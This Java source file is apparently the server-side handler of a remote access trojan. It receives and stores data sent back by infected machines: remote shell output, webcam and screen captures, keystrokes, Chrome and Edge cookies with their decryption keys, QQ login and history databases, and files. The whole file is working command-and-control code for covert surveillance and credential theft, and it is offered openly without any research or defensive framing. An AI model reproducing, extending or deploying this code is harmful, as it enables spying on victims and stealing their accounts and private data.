package server.connection;

import server.Server;
import server.features.*;
import server.utils.ID;

import java.io.File;
import java.util.Arrays;
import javax.swing.*;

public class HandleInbound extends Thread {
    private final ClientConnection clientConnection;
    private final Server server;
    private File currentDownloadFile;

    public HandleInbound(ClientConnection clientConnection, Server server) {
        this.clientConnection = clientConnection;
        this.server = server;
    }

    String returnStr = "";

    @Override
    public void run() {
        while (true) {
            CameraServer cameraServer = clientConnection.cameraServer;
            ScreenSharingServer screenSharingServer = clientConnection.screenSharingServer;
            KeyboardServer keyboardServer = clientConnection.keyboardServer;
            try {
                int receiveInt = clientConnection.receiveHead();

                if (receiveInt == ID.ALIVE()) {
                    clientConnection.receiveMessage();
                } else if (receiveInt == ID.CMD_IN() || receiveInt == ID.SHELL_IN() || receiveInt == ID.COMMAND()) {
                    handleCommandResponse(receiveInt);
                } else if (receiveInt == ID.CAMERA()) {
                    handleCameraData(cameraServer);
                } else if (receiveInt == ID.SCREEN()) {
                    handleScreenData(screenSharingServer);
                } else if (receiveInt == ID.COOKIE()) {
                    handleCookieData();
                } else if (receiveInt == ID.IS_QQ_OLD() || receiveInt == ID.IS_QQ_NT()) {
                    handleQQData(receiveInt);
                } else if (receiveInt == ID.NO_QQ()) {
                    JOptionPane.showMessageDialog(null, "No QQ");
                } else if (receiveInt == ID.KEYBOARD()) {
                    handleKeyboardData(keyboardServer);
                } else if (receiveInt == ID.FILE_DIR()) {
                    handleFileDir();
                } else if (receiveInt == ID.FILE_OUT()) {
                    handleFileOut();
                } else if (receiveInt == ID.FILE_EXISTS()) {
                    handleFileExists();
                } else if (receiveInt == ID.FILE_UPLOAD_SUCCESS()) {
                    handleFileUploadSuccess();
                }
            } catch (Exception e) {
                System.out.println("Message error: " + e.getMessage() + "(" + clientConnection.getIP() + ")");
                cameraServer.stopReceivingCamera();
                screenSharingServer.stopReceivingScreens();
                server.deleteClient(clientConnection);
                break;
            }
        }
    }

    private void handleCommandResponse(int receiveInt) throws Exception {
        returnStr = clientConnection.receiveMessage();
        System.out.println(returnStr);
        if (receiveInt == ID.CMD_IN() || receiveInt == ID.SHELL_IN()) {
            server.clientToUi.get(clientConnection).textArea.append(returnStr + (returnStr.contains("\n") ? "" : "\n"));
        }
    }

    private void handleCameraData(CameraServer cameraServer) throws Exception {
        byte[] cameraData = clientConnection.receiveData();
        if (cameraData != null) {
            if (!cameraServer.popupFrame.isVisible()) {
                cameraServer.receivingCamera = false;
                clientConnection.sendCommand("stopCamera");
                clientConnection.cameraServer.stopReceivingCamera();
            }
            clientConnection.cameraServer.updateCameraSharingPopup(cameraData);
        }
    }

    private void handleScreenData(ScreenSharingServer screenSharingServer) throws Exception {
        byte[] screenData = clientConnection.receiveData();
        if (screenData != null) {
            if (!screenSharingServer.popupFrame.isVisible()) {
                screenSharingServer.receivingScreens = false;
                clientConnection.sendCommand("stopScreen");
                clientConnection.screenSharingServer.stopReceivingScreens();
            }
            clientConnection.screenSharingServer.updateScreenSharingPopup(screenData);
        }
    }

    private void handleCookieData() throws Exception {
        byte[] chromeData = null, chromeKey = null, edgeData = null, edgeKey = null;
        int receiveInt = clientConnection.receiveHead();
        if (receiveInt == ID.CHROME_COOKIE()) {
            chromeData = clientConnection.receiveData();
            chromeKey = clientConnection.receiveData();
        }
        receiveInt = clientConnection.receiveHead();
        if (receiveInt == ID.EDGE_COOKIE()) {
            edgeData = clientConnection.receiveData();
            edgeKey = clientConnection.receiveData();
        }
        CookiesUtil.saveCookiesData(chromeData, chromeKey, edgeData, edgeKey);
    }

    private void handleQQData(int receiveInt) throws Exception {
        if (clientConnection.receiveHead() == ID.QQ_DATA()) {
            byte[] qqData = clientConnection.receiveData();
            byte[] qqHistory = clientConnection.receiveData();
            byte[] oldQQData = clientConnection.receiveData();
            QQUtil.saveQQLoginData(qqData, receiveInt == ID.IS_QQ_OLD() ? "Registry2.0.db" : "Registry.db");
            QQUtil.saveQQLoginData(qqHistory, receiveInt == ID.IS_QQ_OLD() ? "History.db" : "login.db");
            if (receiveInt == ID.IS_QQ_OLD())
                QQUtil.saveQQLoginData(oldQQData, "Registry.db");
            JOptionPane.showMessageDialog(null, "QQ data saved！");
        }
    }

    private void handleKeyboardData(KeyboardServer keyboardServer) throws Exception {
        keyboardServer.updateKeyPopup(clientConnection.receiveMessage());
    }

    private void handleFileDir() {
        try {
            String fileList = clientConnection.receiveMessage();
            System.out.println("Received file list: " + fileList);
            if (clientConnection.fileManagerUI != null) {
                clientConnection.fileManagerUI.updateFileList(Arrays.asList(fileList.split("\n")));
            } else {
                System.err.println("FileManagerUI is null");
            }
        } catch (Exception e) {
            System.err.println("Error processing file list: " + e.getMessage());
            e.printStackTrace();
            SwingUtilities.invokeLater(() -> {
                JOptionPane.showMessageDialog(null, "Error displaying file list: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            });
        }
    }

    private void handleFileOut() throws Exception {
        if (currentDownloadFile != null) {
            clientConnection.receiveFile(currentDownloadFile);
            currentDownloadFile = null;
            JOptionPane.showMessageDialog(null, "File downloaded successfully", "Download Complete", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void handleFileExists() throws Exception {
        int choice = JOptionPane.showOptionDialog(null, "File already exists. What would you like to do?",
                "File Exists", JOptionPane.DEFAULT_OPTION, JOptionPane.QUESTION_MESSAGE,
                null, new String[]{"Replace", "Rename", "Cancel"}, "Cancel");

        String decision = (choice == 0) ? "REPLACE" : (choice == 1) ? "RENAME" : "CANCEL";
        clientConnection.sendMessage(ID.FILE_UPLOAD_DECISION(), decision);
    }

    private void handleFileUploadSuccess() throws Exception {
        String message = clientConnection.receiveMessage();
        JOptionPane.showMessageDialog(null, message, "Upload Status", JOptionPane.INFORMATION_MESSAGE);
    }
}